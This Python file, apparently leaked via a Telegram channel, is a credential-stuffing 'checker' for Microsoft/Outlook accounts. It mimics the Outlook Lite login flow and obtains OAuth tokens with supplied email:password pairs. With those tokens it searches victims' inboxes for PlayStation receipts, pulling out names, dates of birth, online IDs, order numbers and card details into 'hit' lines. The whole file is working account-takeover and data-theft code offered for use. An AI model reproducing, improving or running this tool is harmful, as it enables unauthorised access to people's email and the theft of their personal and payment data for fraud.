import re
import time
import uuid
import json
import requests
from datetime import datetime

# Leak by @SenseiNoir
# Channel: https://t.me/SenseiFall


class PSNFullChecker:
    def __init__(self, debug=False):
        self.debug = debug
        self.timeout = 15
        self.uuid = str(uuid.uuid4())

    def log(self, message):
        if self.debug:
            print(f"[DEBUG] {message}")

    def get_birthday_tiktok_style(self, access_token, cid):
        try:
            graph_headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}'
            }
            session = requests.Session()
            response = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=graph_headers, timeout=self.timeout)
            if response.status_code != 200:
                return "Unknown"
            data = response.json()
            try:
                birthdate = "{:04d}-{:02d}-{:02d}".format(
                    data["accounts"][0]["birthYear"],
                    data["accounts"][0]["birthMonth"],
                    data["accounts"][0]["birthDay"]
                )
                return birthdate
            except (KeyError, IndexError):
                return "Unknown"
        except:
            return "Unknown"

    def get_birthday(self, access_token, cid, email):
        try:
            graph_headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}'
            }
            session = requests.Session()
            profile_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
            r = session.get(profile_url, headers=graph_headers, timeout=self.timeout)
            if r.status_code == 200:
                profile_data = r.json()
                for key in ['birthday', 'birthDate', 'dateOfBirth']:
                    if key in profile_data:
                        return profile_data[key]
                if 'personalInfo' in profile_data and 'birthday' in profile_data['personalInfo']:
                    return profile_data['personalInfo']['birthday']
            return "Unknown"
        except:
            return "Unknown"

    def check_psn_full(self, access_token, cid):
        try:
            session = requests.Session()
            search_url = "https://outlook.live.com/search/api/v2/query"
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": "txn-email.playstation.com"},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            r = session.post(search_url, json=payload, headers=headers, timeout=self.timeout)
            if r.status_code != 200:
                return {"psn_status": "FREE", "psn_orders": 0, "purchases": []}
            data = r.json()
            purchases = []
            total_orders = 0
            if 'EntitySets' in data and len(data['EntitySets']) > 0:
                entity_set = data['EntitySets'][0]
                if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                    result_set = entity_set['ResultSets'][0]
                    total_orders = result_set.get('Total', 0)
                    if 'Results' in result_set:
                        for result in result_set['Results'][:15]:
                            purchase_info = {}
                            if 'Preview' in result:
                                preview = result['Preview']
                                full_text = result.get('ItemBody', {}).get('Content', preview)
                                game_patterns = [
                                    r'Thank you for purchasing\s+([^\.]+?)(?:\s+from|\.|$)',
                                    r'You\'ve bought\s+([^\.]+?)(?:\s+from|\.|$)',
                                    r'Order.*?:\s*([A-Z][^\n\.]{5,60}?)(?:\s+has|\s+is|\s+for|\.|$)',
                                    r'purchased\s+([^\.]{5,60}?)\s+(?:for|from)',
                                    r'Game:\s*([^\n\.]{3,60}?)(?:\n|$)',
                                    r'Content:\s*([^\n\.]{3,60}?)(?:\n|$)',
                                ]
                                for pattern in game_patterns:
                                    match = re.search(pattern, full_text, re.IGNORECASE)
                                    if match:
                                        item_name = match.group(1).strip()
                                        item_name = re.sub(r'\s+', ' ', item_name)
                                        item_name = item_name.replace('\\r', '').replace('\\n', '')
                                        if 5 < len(item_name) < 100:
                                            purchase_info['item'] = item_name
                                            break
                                online_id_match = re.search(r'Online ID:\s*([^\n]+)', full_text, re.IGNORECASE)
                                if online_id_match:
                                    purchase_info['online_id'] = online_id_match.group(1).strip()
                                name_match = re.search(r'Name:\s*([^\n]+)', full_text, re.IGNORECASE)
                                if name_match:
                                    purchase_info['customer_name'] = name_match.group(1).strip()
                                order_match = re.search(r'Order Number:\s*([0-9]+)', full_text, re.IGNORECASE)
                                if order_match:
                                    purchase_info['order_number'] = order_match.group(1).strip()
                                card_match = re.search(r'(VISA|MasterCard|AMEX|Discover|PayPal)\s+([0-9xX]{10,20}):?\s*\$?[\d\.]+', full_text, re.IGNORECASE)
                                if card_match:
                                    purchase_info['card_type'] = card_match.group(1).strip()
                                    purchase_info['card_last4'] = card_match.group(2).strip()
                                    purchase_info['fund_source'] = f"{card_match.group(1)} {card_match.group(2)}"
                                else:
                                    alt_card_match = re.search(r'([A-Za-z0-9\s]+?):\s*\$?[\d\.]+', full_text)
                                    if alt_card_match:
                                        purchase_info['fund_source'] = alt_card_match.group(1).strip()
                                price_patterns = [
                                    r'(?:Total|Amount|Price)[\s:]*[\$€£¥]\s*(\d+[\.,]\d{2})',
                                    r'[\$€£¥]\s*(\d+[\.,]\d{2})',
                                ]
                                for pattern in price_patterns:
                                    price_match = re.search(pattern, full_text)
                                    if price_match:
                                        purchase_info['price'] = price_match.group(0)
                                        break
                                if 'ReceivedTime' in result:
                                    try:
                                        date_str = result['ReceivedTime']
                                        date_obj = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
                                        purchase_info['date'] = date_obj.strftime('%Y-%m-%d')
                                    except:
                                        pass
                            if purchase_info and purchase_info.get('item'):
                                purchases.append(purchase_info)
            if total_orders > 0:
                return {"psn_status": "HAS_ORDERS", "psn_orders": total_orders, "purchases": purchases}
            else:
                return {"psn_status": "FREE", "psn_orders": 0, "purchases": []}
        except:
            return {"psn_status": "ERROR", "psn_orders": 0, "purchases": []}

    def check_account(self, email, password):
        if "@" not in email or len(password) < 3:
            return {"status": "BAD", "email": email, "password": password, "orders": 0, "purchases": [], "reason": "Invalid format"}
        session = requests.Session()
        try:
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": str(uuid.uuid4()),
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = session.get(url1, headers=headers1, timeout=self.timeout)
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "purchases": [], "reason": "Not Hotmail/Outlook"}
            if "MSAccount" not in r1.text:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "purchases": [], "reason": "Not Microsoft account"}
            time.sleep(0.3)
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=self.timeout)
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                ppft_match = re.search(r'name="PPFT".*?value="([^"]+)"', r2.text)
                if not ppft_match:
                    return {"status": "BAD", "email": email, "password": password, "orders": 0, "purchases": [], "reason": "Parse error"}
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=self.timeout)
            response_text = r3.text.lower()
            if "account or password is incorrect" in response_text or r3.text.count("error") > 0:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "purchases": [], "reason": "Wrong password"}
            if "identity/confirm" in response_text or "consent" in response_text:
                return {"status": "2FA", "email": email, "password": password, "orders": 0, "purchases": [], "reason": "2FA required"}
            if "Abuse" in r3.text:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "purchases": [], "reason": "Account suspended"}
            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "purchases": [], "reason": "No redirect"}
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "purchases": [], "reason": "No auth code"}
            code = code_match.group(1)
            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "purchases": [], "reason": "No CID"}
            cid = mspcid.upper()
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=self.timeout)
            if "access_token" not in r4.text:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "purchases": [], "reason": "Token error"}
            access_token = r4.json()["access_token"]
            birthday = self.get_birthday(access_token, cid, email)
            tiktok_dob = self.get_birthday_tiktok_style(access_token, cid)
            if tiktok_dob != "Unknown" and birthday == "Unknown":
                birthday = tiktok_dob
            psn_result = self.check_psn_full(access_token, cid)
            orders = psn_result.get("psn_orders", 0)
            purchases = psn_result.get("purchases", [])
            hit_lines = []
            if orders > 0:
                for p in purchases[:5]:
                    item = p.get('item', 'Unknown')
                    price = p.get('price', 'N/A')
                    online_id = p.get('online_id', 'N/A')
                    customer = p.get('customer_name', 'N/A')
                    order_num = p.get('order_number', 'N/A')
                    card = p.get('card_type', 'N/A')
                    hit_line = f"{email}:{password} | {item} | Price: {price} | Online ID: {online_id} | Customer: {customer} | Order: {order_num} | Card: {card} | DOB: {birthday}"
                    hit_lines.append(hit_line)
                return {
                    "status": "HIT",
                    "email": email,
                    "password": password,
                    "orders": orders,
                    "purchases": purchases,
                    "data": hit_lines,
                    "reason": f"Found {orders} orders"
                }
            elif birthday != "Unknown" or "sony" in str(r4.text).lower():
                hit_lines.append(f"{email}:{password} | No PSN Orders | DOB: {birthday} | Linked Account")
                return {
                    "status": "HIT",
                    "email": email,
                    "password": password,
                    "orders": 0,
                    "purchases": [],
                    "data": hit_lines,
                    "reason": "Valid account, no PSN orders"
                }
            else:
                return {
                    "status": "FREE",
                    "email": email,
                    "password": password,
                    "orders": 0,
                    "purchases": [],
                    "data": [f"{email}:{password}"],
                    "reason": "No PSN data found"
                }
        except requests.Timeout:
            return {"status": "ERROR", "email": email, "password": password, "orders": 0, "purchases": [], "reason": "Timeout"}
        except Exception as e:
            self.log(f"Exception: {str(e)}")
            return {"status": "ERROR", "email": email, "password": password, "orders": 0, "purchases": [], "reason": str(e)[:50]}

    def get_stats(self):
        return {"total_checked": 0, "total_hits": 0}